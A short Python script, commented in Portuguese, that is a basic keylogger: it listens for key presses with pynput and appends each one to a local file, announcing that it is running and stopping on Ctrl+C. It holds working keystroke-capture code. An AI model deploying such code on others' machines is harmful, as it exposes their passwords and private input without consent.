from pynput.keyboard import Listener

# Função para registrar as teclas pressionadas
def registrar_tecla(tecla):
    tecla = str(tecla).replace("'", "")
    with open("dados.txt", "a", encoding="utf-8") as arquivo_log:
        arquivo_log.write(tecla + "\n")

# Função para iniciar o registro de teclas
def iniciar_registro():
    with Listener(on_press=registrar_tecla) as ouvinte:
        ouvinte.join()

# Execução principal do programa
if __name__ == "__main__":
    print("O registrador de teclas está em execução... (pressione CTRL + C para parar)")
    try:
        iniciar_registro()
    except KeyboardInterrupt:
        print("Registro encerrado pelo usuário.")
